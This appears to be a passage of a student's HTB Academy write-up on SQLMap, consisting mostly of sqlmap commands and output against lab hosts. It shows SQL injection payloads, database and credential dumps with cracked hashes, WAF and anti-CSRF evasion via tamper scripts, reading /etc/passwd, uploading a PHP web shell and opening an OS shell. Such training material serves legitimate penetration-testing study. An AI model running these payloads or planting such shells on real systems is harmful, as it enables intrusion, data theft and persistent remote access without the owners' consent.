    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,0x7a6e5a7a706a52574e65665947566f7a59435567746577795748584d4c536e4b7071526f6e417173,0x7176787171),NULL-- -
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL-- -
---
[21:10:01] [INFO] the back-end DBMS is MySQL
[21:10:01] [INFO] fetching banner
[21:10:01] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,VERSION(),0x7176787171),NULL-- -
[21:10:01] [WARNING] reflective value(s) found and filtering out
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL 5 (MariaDB fork)
banner: '10.3.23-MariaDB-0+deb10u1'
[21:10:01] [INFO] fetching current user
[21:10:01] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,CURRENT_USER(),0x7176787171),NULL-- -
current user: 'user1@localhost'
[21:10:01] [INFO] fetching current database
[21:10:01] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,DATABASE(),0x7176787171),NULL-- -
current database: 'testdb'
[21:10:01] [INFO] testing if current user is DBA
[21:10:01] [INFO] fetching current user
[21:10:01] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,JSON_ARRAYAGG(CONCAT_WS(0x6c73716f6966,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x7573657231 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))),0x7176787171),NULL-- -
[21:10:02] [WARNING] potential permission problems detected ('command denied')
[21:10:02] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x7573657231 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x7176787171),NULL-- -
current user is DBA: False

```

### **Table/Row Enumeration**

To find actual data:

| **Goal** | **Switch** | **Example** |
| --- | --- | --- |
| **List Databases** | `--dbs` | `sqlmap -u "URL" --dbs` |
| **List Tables** | `--tables` | `... -D testdb --tables` |
| **List Columns** | `--columns` | `... -D testdb -T users --columns` |
| **Dump Content** | `--dump` | `... -D testdb -T users --dump` |

**For examble:** retrieve the tables of the DB named `testdb`

```bash
$ sqlmap -u "http://94.237.59.242:47626/case1.php?id=1" --tables -D testdb --technique=U -v 3 --no-cast --batch
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,0x7a6e5a7a706a52574e65665947566f7a59435567746577795748584d4c536e4b7071526f6e417173,0x7176787171),NULL-- -
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL-- -
[21:14:56] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,table_name,0x7176787171),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x746573746462)-- -
[21:14:56] [WARNING] reflective value(s) found and filtering out
Database: testdb
[2 tables]
+-------+
| flag1 |
| users |
+-------+

```

after finding the table of interest, dump the content using the `—dump` switch and provide the name of the DB and the table you want to dump

```bash
sqlmap -u "http://94.237.59.242:47626/case1.php?id=1" -D testdb -T flag1 --dump --technique=U -v 3 --no-cast --batch

[21:22:54] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,JSON_ARRAYAGG(CONCAT_WS(0x6c73716f6966,content,id)),0x7176787171),NULL FROM testdb.flag1-- -
[21:22:54] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171707871,content,0x6c73716f6966,id,0x7176787171),NULL FROM testdb.flag1-- -
[21:22:54] [DEBUG] performed 2 queries in 0.26 seconds
[21:22:54] [DEBUG] analyzing table dump for possible password hashes
Database: testdb
Table: flag1
[1 entry]
+----+-----------------------------------------------------+
| id | content                                             |
+----+-----------------------------------------------------+
| 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
+----+-----------------------------------------------------+

 
```

we can also specify the columns we want to dump

```bash
sqlmap -u "http://94.237.59.242:47626/case1.php?id=1" -D testdb -T flag1 -C content --dump
```

If we want to narrow down the information received, for instance, the `users` table has 32 entries, if we want to only retrieve the first three rows, use the `start` and `stop` switches

```bash
$ sqlmap -u "http://94.237.59.242:47626/case1.php?id=1" -D testdb -T users -C name,email,password --start=1 --stop=3 --dump --technique=U -v 3 --no-cast --batch
...
Database: testdb
Table: users
[3 entries]
+-----------------+---------------------------+-----------------------------------------------------+
| name            | email                     | password                                            |
+-----------------+---------------------------+-----------------------------------------------------+
| Maynard Rice    | MaynardMRice@yahoo.com    | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)     |
| Julio Thomas    | JulioWThomas@gmail.com    | 10946aa229a6d569f226976b22ea0e900a1fc219            |
| Kenneth Maloney | KennethTMaloney@gmail.com | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus) |
+-----------------+---------------------------+-----------------------------------------------------+

```

Retrieve certain rows based on a known `WHERE` condition. For instance, retrieve the users table where the user=Maynard Rice

```bash
$ sqlmap -u "http://94.237.59.242:47626/case1.php?id=1" -D testdb -T users -C name,email,password --where="name='Maynard Rice'" --dump --technique=U --no-cast --batch
Database: testdb
Table: users
[1 entry]
+--------------+------------------------+-------------------------------------------------+
| name         | email                  | password                                        |
+--------------+------------------------+-------------------------------------------------+
| Maynard Rice | MaynardMRice@yahoo.com | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052) |
+--------------+------------------------+-------------------------------------------------+

```

## **Advanced Database Enumeration**

### **DB Schema Enumeration**

When you need a high-level view of the entire database structure without dumping all the data, use the `--schema` switch. This provides a map of all databases, their tables, and the specific **data types** of each column (e.g., `int`, `varchar`, `blob`).

```bash
$ sqlmap -u "http://94.237.55.124:40059/case1.php?id=1" --schema
```

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/13.png)

To exclude system databases, use `--exclude-sysdbs` switch 

```bash
sqlmap -u "<target>" --schema --exclude-sysdbs
```

### Target searching

In massive databases, manually browsing tables is inefficient. SQLMap provides the `--search` option, which uses the `LIKE` operator to find specific identifiers:

| **Target** | **Command** | **Purpose** |
| --- | --- | --- |
| **Tables** | `--search -T user` | Finds all tables with "user" in the name. |
| **Columns** | `--search -C pass` | Finds all columns with "pass" in the name (e.g., `password`, `passwd`). |
| **Databases** | `--search -D backup` | Finds databases with "backup" in the name. |

### **Password Enumeration and Cracking**

Before, when we dumped the users table of the first three rows, the sqlmap detected a column containing hashed (like MD5, SHA1, or MySQL password formats) which automatically prompt us to crack them.

```bash
22:01:33] [WARNING] reflective value(s) found and filtering out
[22:01:33] [INFO] retrieved: 'Maynard Rice','MaynardMRice@yahoo.com','9a0f092c8d52eaf3ea423cef8485702ba2b3deb9'
[22:01:33] [INFO] retrieved: 'Julio Thomas','JulioWThomas@gmail.com','10946aa229a6d569f226976b22ea0e900a1fc219'
[22:01:34] [INFO] retrieved: 'Kenneth Maloney','KennethTMaloney@gmail.com','a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295'
[22:01:34] [INFO] recognized possible password hashes in column 'password'                                               
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[22:01:34] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[22:01:34] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[22:01:34] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[22:01:34] [INFO] starting 2 processes 
[22:01:35] [INFO] cracked password '3052' for hash '9a0f092c8d52eaf3ea423cef8485702ba2b3deb9'                            
[22:01:38] [INFO] cracked password 'hibiskus' for hash 'a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295'                        
Database: testdb                                                                                                         
Table: users
[3 entries]
+-----------------+---------------------------+-----------------------------------------------------+
| name            | email                     | password                                            |
+-----------------+---------------------------+-----------------------------------------------------+
| Maynard Rice    | MaynardMRice@yahoo.com    | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)     |
| Julio Thomas    | JulioWThomas@gmail.com    | 10946aa229a6d569f226976b22ea0e900a1fc219            |
| Kenneth Maloney | KennethTMaloney@gmail.com | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus) |
+-----------------+---------------------------+-------------
```

**System Credentials:** The `--passwords` switch specifically targets the DBMS system tables to retrieve the credentials used by the database administrators themselves (e.g., the `root` user's password).

```bash
sqlmap -u "<url>" --passwords --batch
```

In our example, we dont have the `sys` db

## **Bypassing Web Application Protections**

| **Category** | **Switch** | **Description** |
| --- | --- | --- |
| **CSRF Bypass** | `--csrf-token` | Automatically parses and updates anti-CSRF tokens for each new request. |
| **Input Validation** | `--randomize=PARAM` | Generates unique random values for a specific parameter to prevent cache/CSRF blocks. |
| **Custom Logic** | `--eval="PYTHON"` | Executes Python code to calculate/re-hash parameters (e.g., MD5 hashes) before sending. |
| **Anonymity** | `--proxy=URL` | Routes traffic through a SOCKS/HTTP proxy to conceal your IP address. |
| **Anonymity** | `--tor` | Automatically routes all traffic through the Tor network. |
| **Anonymity** | `--check-tor` | Verifies that the connection is successfully using the Tor network before starting. |
| **WAF/IPS** | `--tamper=SCRIPT` | Uses Python scripts to obfuscate payloads (e.g., `space2comment`, `randomcase`). |
| **WAF/IPS** | `--skip-waf` | Skips the initial heuristic test that checks for the presence of a WAF. |
| **User-Agent** | `--random-agent` | Replaces the default "sqlmap" header with a random, legitimate browser User-Agent. |
| **Evasion** | `--chunked` | Splits POST data into multiple chunks to bypass signature-based inspection. |
| **Evasion** | `--hpp` | Uses **H**TTP **P**arameter **P**ollution to split payloads across duplicate parameters. |

### Case8 - anti-CSRF token bypass

Detect and exploit SQLi vulnerability in POST parameter `id`, while taking care of the anti-CSRF protection (Note: non-standard token name is used)

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/14.png)

In **Case 8**, the application is using a **synchronized token pattern** to prevent automation and Cross-Site Request Forgery (CSRF). An anti-CSRF token (like your `t0ken` parameter) is a unique, secret, and unpredictable value generated by the server for the user's current session.

For example: when you load the page `case8.php`, the server hides a token in the HTML (usually in an `<input type="hidden">` tag). ****

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/15.png)

When you submit the form, the browser sends that token back. The server compares the submitted token with the one it has stored. If you try to run a standard SQLMap command, it will fail after the first request because the token expires or changes. SQLMap would send the *same* token repeatedly, but the server expects a *new* one for every request. 

Therefor, we will use the `--csrf-token` switch to tune the SQLMap to look for a hidden input or parameter named `t0ken` in the server's response and update its value before sending the next injection attempt.

```bash
$ sqlmap -r case-8.txt --csrf-token="t0ken" --batch -v 3 --dbms mysql -D testdb -T flag8 -C id,content --dump -t case8-traffic.txt

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9217=9217&t0ken=KeibBAouhbmmTTHl70k57Nc2A5GQgMEkGvnIRQwwA
    Vector: AND [INFERENCE]

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#&t0ken=KeibBAouhbmmTTHl70k57Nc2A5GQgMEkGvnIRQwwA
    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7817 FROM (SELECT(SLEEP(5)))ZVaG)&t0ken=KeibBAouhbmmTTHl70k57Nc2A5GQgMEkGvnIRQwwA
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x717a787871,0x4d5258465a4d4d77704b55427058714752555263417454696949584d716a69566450615642787248,0x716b627671),NULL,NULL,NULL,NULL-- -&t0ken=KeibBAouhbmmTTHl70k57Nc2A5GQgMEkGvnIRQwwA
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL-- -
---
Database: testdb
Table: flag8
[1 entry]
+----+-----------------------------------+
| id | content                           |
+----+-----------------------------------+
| 1  | HTB{y0u_[REDIRECT]n1z3d} |
+----+-----------------------------------+

```

This is how the request was like:

```bash
GET req: QvzgwuxFRGQ3tIhnnVW5q67bZmAgxucQagRnMtZvQ
POST req: id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag8 ORDER BY id LIMIT 0,1),1,1))>49&t0ken=QvzgwuxFRGQ3tIhnnVW5q67bZmAgxucQagRnMtZvQ

##########################################################

GET request: WTgnA9De9LNZRxid0Vj7xND3tmefVfrzvkHsBxcWyQ
POST req: id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag8 ORDER BY id LIMIT 0,1),2,1))>47&t0ken=WTgnA9De9LNZRxid0Vj7xND3tmefVfrzvkHsBxcWyQ 
##########################################################

GET req: eqxNGFUWIbL9n1GsxTC4hzWj3RbyQKQiviklA1Wr7AI
Post reqt: id=1 AND ORD(MID((SELECT IFNULL(CAST(id AS CHAR),0x20) FROM testdb.flag8 ORDER BY id LIMIT 0,1),2,1))>1&t0ken=eqxNGFUWIbL9n1GsxTC4hzWj3RbyQKQiviklA1Wr7AI

##########################################################
```

Note, for each POST request, there is a GET request before it to retrieve a new token from the server

### Case9 - Unique ID

Detect and exploit SQLi vulnerability in GET parameter `id`, while taking care of the unique `uid`

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/16.png)

In the context of **SQLMap** and web security, this "unique value" requirement is often used to prevent replay attacks or simple automation. To bypass this protection, use `—randomize` switch, which will create a random unique value for each request

```bash
$ sqlmap -r case-9.txt --randomize="uid" --batch -v 5 --dbms mysql -D testdb -T flag9 -C id,content --dump
sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2133=2133&uid=3967487313
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5229 FROM (SELECT(SLEEP(5)))icjm)&uid=3967487313
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7071,0x574166545074544a536d644471744f674f526a576d5143735a55477777524942554e4f5841565662,0x716b6a7871),NULL,NULL,NULL-- -&uid=3967487313
    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL-- -

Database: testdb
Table: flag9
[1 entry]
+----+---------------------------------------+
| id | content                               |
+----+---------------------------------------+
| 1  | HTB{700_[REDIRECT]_74573} |
+----+---------------------------------------+

```

Request:  Note, in each request has a different `uid` value

```bash
URI: http://94.237.121.111:49650/case9.php?id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7071,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x716b6a7871),NULL,NULL,NULL-- -&uid=1813677485

URI: http://94.237.121.111:49650/case9.php?id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7071,JSON_ARRAYAGG(CONCAT_WS(0x70636c7a687a,IFNULL(CAST(content AS NCHAR),0x20),IFNULL(CAST(id AS NCHAR),0x20))),0x716b6a7871),NULL,NULL,NULL FROM testdb.flag9-- -&uid=2801487206

URI: http://94.237.121.111:49650/case9.php?id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7071,IFNULL(CAST(content AS NCHAR),0x20),0x70636c7a687a,IFNULL(CAST(id AS NCHAR),0x20),0x716b6a7871),NULL,NULL,NULL FROM testdb.flag9-- -&uid=7239630766

```

### Case10 - Primitive protection

Detect and exploit SQLi vulnerability in POST parameter `id`

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/17.png)

We can SQLi without modifying the request, but I run the test with between and randomcase scripts

```bash
$ sqlmap -r case-10.txt -v 5 --tamper=between,randomcase --technique=U --dbms mysql -D testdb -T flag10 -C id,content --dump --batch  --hex
...
Database: testdb
Table: flag10
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{y37[REDIRECT]z3} |
+----+----------------------------+

```

Requests: 

```sql
id=1 uniON aLl sELEct NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,CONcaT(0x716b6b7871,(cAse When (ISNuLL(VEctOr_dIm(NuLL))) THeN 1 eLSE 0 End),0x7176767671)-- -

id=1 unIoN alL sElEcT nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,coNCat(0x716b6b7871,(caSe When (ISnuLL(jsOn_StorAge_fREe(nuLL))) ThEN 1 elSE 0 enD),0x7176767671)-- -

id=1 UNIon ALl SELecT nulL,nulL,nulL,nulL,nulL,nulL,nulL,nulL,cONCAT(0x716b6b7871,(cASE WHEn (ISnulL(timeSTaMpADD(MInUTE,3564,nulL))) tHEN 1 eLSE 0 eNd),0x7176767671)-- -

id=1 uNIOn All sElECt nULl,nULl,nULl,nULl,nULl,nULl,nULl,nULl,CoNCat(0x716b6b7871,JsON_ArRAyaGg(CoNCat_WS(0x796775796176,HEx(IFnULl(caST(content As chAR),0x20)),HEx(IFnULl(caST(id As chAR),0x20)))),0x7176767671) fROm testdb.flag10-- -

id=1 uNiON alL SelecT Null,Null,Null,Null,Null,Null,Null,Null,cONCAT(0x716b6b7871,hEX(IFNull(CAst(content As cHAr),0x20)),0x796775796176,hEX(IFNull(CAst(id As cHAr),0x20)),0x7176767671) froM testdb.flag10-- -
```

**The most notable tamper scripts are the following:**

| **Tamper-Script** | **Description** |
| --- | --- |
| `0eunion` | Replaces instances of  UNION with e0UNION |
| `base64encode` | Base64-encodes all characters in a given payload |
| `between` | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #` |
| `commalesslimit` | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart |
| `equaltolike` | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword |
| `modsecurityversioned` | Embraces complete query with (MySQL) versioned comment |
| `modsecurityzeroversioned` | Embraces complete query with (MySQL) zero-versioned comment |
| `percentage` | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T) |
| `plus2concat` | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart |
| `randomcase` | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt) |
| `space2comment` | Replaces space character ( ``) with comments `/ |
| `space2dash` | Replaces space character ( ``) with a dash comment (`--`) followed by a random string and a new line (`\n`) |
| `space2hash` | Replaces (MySQL) instances of space character ( ``) with a pound character (`#`) followed by a random string  and a new line (`\n`) |
| `space2mssqlblank` | Replaces (MsSQL) instances of space character ( ``) with a random blank character from a valid set of alternate characters |
| `space2plus` | Replaces space character ( ``) with plus (`+`) |
| `space2randomblank` | Replaces space character ( ``) with a random blank character from a valid set of alternate characters |
| `symboliclogical` | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `||`) |
| `versionedkeywords` | Encloses each non-function keyword with (MySQL) versioned comment |
| `versionedmorekeywords` | Encloses each keyword with (MySQL) versioned comment |

To get a whole list of implemented tamper scripts, along with the description as above, switch `--list-tampers` can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.

- source: HTB academy

### Case11 - Filtering of characters '<', '>'

Detect and exploit SQLi vulnerability in GET parameter `id`

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/18.png)

the between script replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`

```bash
$ sqlmap -u "http://94.237.58.137:43185/case11.php?id=1*" -v 5 --tamper=between --technique=UB --dbms mysql  -D testdb -T flag11 -C id,content --dump --batch  --hex

 
 [12:35:23] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="1958")
 sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b6b7871,0x566c6a63484572524176526374684f4a4678594c6542757369574245674e7249576e767379435255,0x7176767671)-- -
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY]-- -
---
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
sqlmap identified the following injection point(s) with a total of 312 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://94.237.58.137:43185/case11.php?id=1 AND 7847=7847
    Vector: AND [INFERENCE]
---
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
Database: testdb
Table: flag11
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{5p[REDIRECT]r3} |
+----+----------------------------+
  
 
```

Requests:

```sql
id=1 AND ORD(MID((SELECT HEX(IFNULL(CAST(id AS NCHAR),0x20)) FROM testdb.flag11 ORDER BY id LIMIT 0,1),3,1)) NOT BETWEEN 0 AND 52

id=1 AND ORD(MID((SELECT HEX(IFNULL(CAST(id AS NCHAR),0x20)) FROM testdb.flag11 ORDER BY id LIMIT 0,1),3,1)) NOT BETWEEN 0 AND 48

id=1 AND ORD(MID((SELECT HEX(IFNULL(CAST(id AS NCHAR),0x20)) FROM testdb.flag11 ORDER BY id LIMIT 0,1),3,1)) NOT BETWEEN 0 AND 1
```

## **OS Exploitation**

### Prerequisites for OS Exploitation

Exploiting the OS requires specific conditions to be met within the DBMS:

- **DBA Privileges:** You must check if the current user is a Database Administrator using the `-is-dba` switch. Being a DBA usually grants the necessary permissions for file operations.
- **File Permissions:** In MySQL, the `secure_file_priv` variable must be configured to allow writing, and the DB user needs `FILE` privileges.

| **Switch** | **Purpose** |
| --- | --- |
| **`--is-dba`** | Checks for administrator rights (required for most OS exploits). |
| **`--file-read="/path"`** | Retrieves the content of a file from the remote server. |
| **`--file-write="local"`** | Prepares a local file for upload. |
| **`--file-dest="/remote"`** | Sets the target path for a file upload (requires a writable directory). |
| **`--os-shell`** | Attempts to provide an interactive operating system shell. |
| **`--os-pwn`** | Attempts to provide an OOB (Out-of-Band) shell (e.g., Meterpreter). |

### Case-12-OS Exploitation

Use SQLi vulnerability in GET parameter `id` to exploit the host OS.

**Checking for read permission:**

```sql
sqlmap -u "http://94.237.61.248:34436/?id=1" --is-dba
..
[13:31:01] [INFO] testing if current user is DBA
[13:31:01] [INFO] fetching current user
current user is DBA: True
```

Reading file system using the `—file-read` switch

```bash
$ sqlmap -u "http://94.237.61.248:34436/?id=1" --file-read="/etc/passwd" -v 3 --batch --hex
[13:56:03] [INFO] fetching file: '/etc/passwd'
[13:56:03] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,CONCAT(0x71786b6271,HEX(IFNULL(CAST(HEX(LOAD_FILE(0x2f6574632f706173737764)) AS CHAR),0x20)),0x71786a6b71),NULL,NULL,NULL-- -

do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[13:56:03] [DEBUG] used the default behavior, running in batch mode
[13:56:03] [DEBUG] checking the length of the remote file '/etc/passwd'
[13:56:03] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,CONCAT(0x71786b6271,HEX(IFNULL(CAST(LENGTH(LOAD_FILE(0x2f6574632f706173737764)) AS CHAR),0x20)),0x71786a6b71),NULL,NULL,NULL-- -
[13:56:04] [DEBUG] performed 1 query in 0.26 seconds
[13:56:04] [INFO] the local file '/home/kali/.local/share/sqlmap/output/94.237.61.248/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B) 
```

result:

```bash
$ tail /home/kali/.local/share/sqlmap/output/94.237.61.248/files/_etc_passwd
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

**Checking for writing permission**: when checking for writing permission, we try to upload a file into the target and check the response for any error

```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
$ sqlmap -u "http://94.237.61.248:34436/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" -v 3 --batch
...
[13:41:46] [DEBUG] inserting the hexadecimal encoded file to the support table
[13:41:46] [PAYLOAD] 1;SET GLOBAL max_allowed_packet = 1048576#
[13:41:46] [PAYLOAD] 1;INSERT INTO sqlmapfile(data) VALUES (0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e0a)#
[13:41:46] [DEBUG] exporting the text file content to file '/var/www/html/shell.php'
[13:41:46] [PAYLOAD] 1;SELECT data FROM sqlmapfile INTO DUMPFILE '/var/www/html/shell.php'#
[13:41:46] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] Y
[13:41:54] [DEBUG] used the default behavior, running in batch mode
[13:41:54] [DEBUG] checking the length of the remote file '/var/www/html/shell.php'
[13:41:54] [PAYLOAD] 1 UNION ALL SELECT NULL,NULL,CONCAT(0x71786b6271,IFNULL(CAST(LENGTH(LOAD_FILE(0x2f7661722f7777772f68746d6c2f7368656c6c2e706870)) AS NCHAR),0x20),0x71786a6b71),NULL,NULL,NULL-- -
[13:41:54] [WARNING] reflective value(s) found and filtering out
[13:41:54] [DEBUG] performed 1 query in 0.14 seconds
[13:41:54] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

```

We have successfully uploaded the shell into the target. Now fetch the uploaded file and pass OS command into the `cmd` parameter

```bash
$ curl "http://94.237.61.248:34436/shell.php?cmd=id"    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

If you don't know the exact path of the webroot, you can use the `--os-shell` command. SQLMap will automatically run a series of tests to find a writable directory.

```sql
$ sqlmap -u "http://94.237.61.248:34436/?id=1" --os-shell -v 3 --batch 
[13:35:32] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://94.237.61.248:34436/tmputjfr.php
[13:35:33] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://94.237.61.248:34436/tmpbpsuf.php
[13:35:33] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[13:35:49] [DEBUG] used the default behavior, running in batch mode
command standard output: 'www-data'
os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] Y
[13:35:54] [DEBUG] used the default behavior, running in batch mode
command standard output:
---
basic.php
common.inc.php
flag.txt
index.php
logo.png
robots.txt
template.php
tmpbpsuf.php
tmputjfr.php
vendor
---

```

## SQLmap Skill Assessments

Started burp and navigated throughout the website. In the shop.html page, a POST request will be made when you add an item into the cart

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/19.png)

POST request to the action.php page

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/20.png)

Testing for SQLi 

```bash
{"id":1'}
```

![ALT](/HTB/Web_Penetration_Tester/SQLMap_Essentials/Images/21.png)

The syntax `near ', 492, 1, 892, 0)'` suggests the backend query looks something like this:
`INSERT INTO table_name VALUES ($id, 492, 1, 892, 0)` or `SELECT ... WHERE id IN ($id, 492, 1...)`. Since the application is expecting a JSON-style POST but the database is processing it as part of a list of values, we need to "close" the current statement or use a subquery that fits into that list. And because the response is empty (`Content-Length: 0`) for valid request, we should rely on **Time-Based** or **Error-Based** techniques.

```bash
$ sqlmap -r req-action.txt  --batch --tamper=between,space2comment --dbms=mysql --technique=ET

[00:06:42] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                                  
[00:06:42] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 954 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "1 AND (SELECT 3656 FROM (SELECT(SLEEP(5)))VRaz)"}
---
[00:07:00] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[00:07:00] [INFO] the back-end DBMS is MySQL
[00:07:00] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
